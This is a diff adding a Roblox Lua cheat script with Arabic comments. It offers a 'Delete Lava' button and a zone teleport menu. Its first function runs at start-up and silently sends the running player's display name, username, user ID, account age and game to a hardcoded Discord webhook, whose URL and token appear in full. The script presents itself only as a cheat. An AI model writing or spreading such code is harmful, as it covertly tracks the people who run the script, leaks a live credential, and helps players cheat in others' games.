@@ -1,0 +1,320 @@
+-- LocalScript (StarterPlayerScripts) - للاستخدام في Roblox Studio
+-- أو يمكنك نسخه مباشرة إلى منصة التشغيل الخارجية
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- ========== WEBHOOK ==========
+local function sendWebhook()
+	local webhookURL = "https://discord.com/api/webhooks/1477301125320409140/VgBqzfYxi8WX9Y0RT0pD3Zpz_2sptl1iDydHUILvl7TD4EP1nS78Nkm2l4MtPXZt8yDF"
+
+	-- جمع المعلومات
+	local displayName = player.DisplayName or player.Name
+	local username = "@" .. player.Name
+	local userId = player.UserId
+	local accountAge = player.AccountAge .. " Days"
+	local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or game.Name
+	local currentTime = os.date("%I:%M %p")
+
+	-- بناء الرسالة
+	local content = "@everyone | دخل جديد  \n\nOpen script now! 🔥  \nDisplay Name  Username  \n" .. displayName .. "    " .. username .. "  \n\nUser ID  \n" .. userId .. "  \n\nAccount Age  \n" .. accountAge .. "  \n\nGame  \n" .. gameName .. "  \n\nTik : ASNO • Rob : YT7_7 I " .. currentTime
+
+	-- تحويل إلى JSON
+	local data = { content = content }
+	local jsonData = HttpService:JSONEncode(data)
+
+	-- دالة الإرسال المتوافقة مع المنصات
+	local requestFunc = syn and syn.request or http_request or request
+	if requestFunc then
+		pcall(function()
+			requestFunc({
+				Url = webhookURL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = jsonData
+			})
+			print("✅ Webhook sent via request")
+		end)
+	else
+		-- إذا لم توجد، نستخدم HttpService (قد لا يعمل في المنصة)
+		pcall(function()
+			HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+			print("✅ Webhook sent via HttpService")
+		end)
+	end
+end
+
+-- إرسال الويب هوك فور تشغيل السكربت
+sendWebhook()
+
+-- ========== باقي السكربت (حذف الحمم والتليپورت) ==========
+local targets = {
+	["Fast"] = true,
+	["Slow"] = true,
+	["Medium"] = true,
+	["Very Slow"] = true,
+	["Demon"] = true,
+	["Extreme"] = true,
+	["Insane"] = true,
+	["Snake"] = true,
+	["HoleInFloor"] = true,
+	["Wonky"] = true
+}
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "FaisalScriptGUI"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+local panel = Instance.new("Frame")
+panel.Name = "MainPanel"
+panel.Size = UDim2.new(0, 320, 0, 160)
+panel.Position = UDim2.new(0.5, -160, 0.5, -80)
+panel.AnchorPoint = Vector2.new(0.5, 0.5)
+panel.BackgroundColor3 = Color3.fromRGB(18,18,18)
+panel.BorderSizePixel = 0
+panel.Active = true
+panel.Draggable = true
+panel.Parent = gui
+Instance.new("UICorner", panel).CornerRadius = UDim.new(0,12)
+local panelStroke = Instance.new("UIStroke", panel)
+panelStroke.Thickness = 1
+panelStroke.Transparency = 0.7
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -12, 0, 30)
+title.Position = UDim2.new(0, 6, 0, 8)
+title.BackgroundTransparency = 1
+title.Text = "Faisal-Script"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 20
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextXAlignment = Enum.TextXAlignment.Center
+title.Parent = panel
+
+local toggleBtn = Instance.new("TextButton")
+toggleBtn.Name = "ToggleBtn"
+toggleBtn.Size = UDim2.new(0, 30, 0, 26)
+toggleBtn.Position = UDim2.new(1, -38, 0, 8)
+toggleBtn.BackgroundColor3 = Color3.fromRGB(110,110,110)
+toggleBtn.TextColor3 = Color3.fromRGB(255,255,255)
+toggleBtn.Text = "X"
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextSize = 18
+toggleBtn.Parent = panel
+Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0,6)
+
+local content = Instance.new("Frame")
+content.Name = "Content"
+content.Size = UDim2.new(1, -12, 1, -52)
+content.Position = UDim2.new(0,6,0,42)
+content.BackgroundTransparency = 1
+content.Parent = panel
+
+local deleteBtn = Instance.new("TextButton")
+deleteBtn.Name = "DeleteLava"
+deleteBtn.Size = UDim2.new(0.86, 0, 0, 48)
+deleteBtn.Position = UDim2.new(0.07, 0, 0, 0)
+deleteBtn.BackgroundColor3 = Color3.fromRGB(180,0,0)
+deleteBtn.TextColor3 = Color3.fromRGB(255,255,255)
+deleteBtn.Text = "Delete Lava 😈"
+deleteBtn.Font = Enum.Font.GothamSemibold
+deleteBtn.TextSize = 20
+deleteBtn.Parent = content
+Instance.new("UICorner", deleteBtn).CornerRadius = UDim.new(0,10)
+Instance.new("UIStroke", deleteBtn).Transparency = 0.6
+
+local teleportBtn = Instance.new("TextButton")
+teleportBtn.Name = "TeleportBtn"
+teleportBtn.Size = UDim2.new(0.86, 0, 0, 36)
+teleportBtn.Position = UDim2.new(0.07, 0, 0, 56)
+teleportBtn.BackgroundColor3 = Color3.fromRGB(55,55,55)
+teleportBtn.TextColor3 = Color3.fromRGB(255,255,255)
+teleportBtn.Text = "teleport"
+teleportBtn.Font = Enum.Font.Gotham
+teleportBtn.TextSize = 18
+teleportBtn.Parent = content
+Instance.new("UICorner", teleportBtn).CornerRadius = UDim.new(0,8)
+
+local monitoringStarted = false
+local monitoringConn
+
+local function deleteAllTargets()
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if targets[obj.Name] then
+			pcall(function() obj:Destroy() end)
+		end
+	end
+end
+
+local function startMonitoring()
+	if monitoringStarted then return end
+	monitoringStarted = true
+	monitoringConn = workspace.DescendantAdded:Connect(function(obj)
+		if targets[obj.Name] then
+			pcall(function() obj:Destroy() end)
+		end
+	end)
+end
+
+deleteBtn.MouseButton1Click:Connect(function()
+	deleteAllTargets()
+	startMonitoring()
+	deleteBtn.BackgroundColor3 = Color3.fromRGB(0,140,0)
+end)
+
+local teleportMenu = nil
+local panelOpen = true
+local originalSize = panel.Size
+
+toggleBtn.MouseButton1Click:Connect(function()
+	panelOpen = not panelOpen
+	if panelOpen then
+		panel.Size = originalSize
+		toggleBtn.Text = "X"
+		for _, obj in ipairs(panel:GetChildren()) do
+			if obj:IsA("GuiObject") and obj ~= toggleBtn and obj ~= title then
+				obj.Visible = true
+			end
+		end
+		if teleportMenu and teleportMenu.Parent then
+			teleportMenu.Visible = true
+		end
+	else
+		for _, obj in ipairs(panel:GetChildren()) do
+			if obj:IsA("GuiObject") and obj ~= toggleBtn and obj ~= title then
+				obj.Visible = false
+			end
+		end
+		panel.Size = UDim2.new(originalSize.X.Scale, originalSize.X.Offset, 0, 40)
+		toggleBtn.Text = "X"
+		if teleportMenu and teleportMenu.Parent then
+			teleportMenu.Visible = false
+		end
+	end
+end)
+
+local function findPartByName(name)
+	for _, obj in ipairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and obj.Name == name then
+			return obj
+		end
+	end
+	return nil
+end
+
+local function createTeleportMenu()
+	if teleportMenu and teleportMenu.Parent then
+		teleportMenu.Visible = true
+		return
+	end
+
+	local zoneNames = {
+		"COMMON",
+		"EPIC",
+		"MYTHIC",
+		"DIVINE",
+		"OMEGA",
+		"HELLFIRE",
+		"CELESTIAL",
+		"ETERNAL",
+		"IMPOSSIBLE"
+	}
+
+	teleportMenu = Instance.new("Frame")
+	teleportMenu.Name = "TeleportMenu"
+	teleportMenu.Size = UDim2.fromOffset(250, 280)
+	teleportMenu.Position = UDim2.fromOffset(panel.AbsolutePosition.X + panel.AbsoluteSize.X + 8, panel.AbsolutePosition.Y)
+	teleportMenu.BackgroundColor3 = Color3.fromRGB(30,30,30)
+	teleportMenu.BorderSizePixel = 0
+	teleportMenu.AnchorPoint = Vector2.new(0,0)
+	teleportMenu.Parent = gui
+	teleportMenu.ZIndex = 100
+	teleportMenu.ClipsDescendants = false
+	Instance.new("UICorner", teleportMenu).CornerRadius = UDim.new(0,12)
+	Instance.new("UIStroke", teleportMenu).Transparency = 0.7
+
+	local tTitle = Instance.new("TextLabel")
+	tTitle.Size = UDim2.new(1, -20, 0, 32)
+	tTitle.Position = UDim2.fromOffset(10, 8)
+	tTitle.BackgroundTransparency = 1
+	tTitle.Text = "Teleport Zones"
+	tTitle.Font = Enum.Font.GothamBold
+	tTitle.TextSize = 20
+	tTitle.TextColor3 = Color3.fromRGB(255,255,255)
+	tTitle.TextXAlignment = Enum.TextXAlignment.Center
+	tTitle.Parent = teleportMenu
+
+	local closeFull = Instance.new("TextButton")
+	closeFull.Size = UDim2.fromOffset(30, 28)
+	closeFull.Position = UDim2.new(1, -40, 0, 8)
+	closeFull.BackgroundColor3 = Color3.fromRGB(200,50,50)
+	closeFull.Text = "X"
+	closeFull.Font = Enum.Font.GothamBold
+	closeFull.TextSize = 18
+	closeFull.TextColor3 = Color3.fromRGB(255,255,255)
+	closeFull.Parent = teleportMenu
+	closeFull.ZIndex = 101
+	Instance.new("UICorner", closeFull).CornerRadius = UDim.new(0,6)
+
+	local buttonsHolder = Instance.new("Frame")
+	buttonsHolder.Size = UDim2.new(1, -20, 1, -60)
+	buttonsHolder.Position = UDim2.fromOffset(10, 44)
+	buttonsHolder.BackgroundTransparency = 1
+	buttonsHolder.Parent = teleportMenu
+	buttonsHolder.ZIndex = 100
+
+	local grid = Instance.new("UIGridLayout")
+	grid.FillDirection = Enum.FillDirection.Horizontal
+	grid.HorizontalAlignment = Enum.HorizontalAlignment.Center
+	grid.VerticalAlignment = Enum.VerticalAlignment.Top
+	grid.CellSize = UDim2.fromOffset(70, 60)
+	grid.CellPadding = UDim2.fromOffset(6, 6)
+	grid.Parent = buttonsHolder
+
+	for i = 1, 9 do
+		local zonePartName = "Zone"..i
+		local btn = Instance.new("TextButton")
+		btn.Name = "Btn"..zonePartName
+		btn.Size = UDim2.fromOffset(70, 60)
+		btn.BackgroundColor3 = Color3.fromRGB(0, 120, 210)
+		btn.TextColor3 = Color3.fromRGB(255,255,255)
+		btn.Text = zoneNames[i]
+		btn.Font = Enum.Font.GothamBold
+		btn.TextSize = 14
+		btn.Parent = buttonsHolder
+		btn.ZIndex = 101
+		Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
+		Instance.new("UIStroke", btn).Transparency = 0.5
+
+		btn.MouseButton1Click:Connect(function()
+			local char = player.Character or player.CharacterAdded:Wait()
+			local hrp = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso")
+			if hrp then
+				if zonePartName == "Zone9" then
+					TweenService:Create(hrp, TweenInfo.new(0.25), {CFrame = CFrame.new(89, 295, -144)}):Play()
+				else
+					local part = findPartByName(zonePartName)
+					if part then
+						TweenService:Create(hrp, TweenInfo.new(0.25), {CFrame = part.CFrame + Vector3.new(0, 5, 0)}):Play()
+					end
+				end
+			end
+		end)
+	end
+
+	closeFull.MouseButton1Click:Connect(function()
+		teleportMenu:Destroy()
+		teleportMenu = nil
+	end)
+
+	teleportMenu.BackgroundTransparency = 1
+	TweenService:Create(teleportMenu, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+end
+
+teleportBtn.MouseButton1Click:Connect(function()
+	createTeleportMenu()
+end)
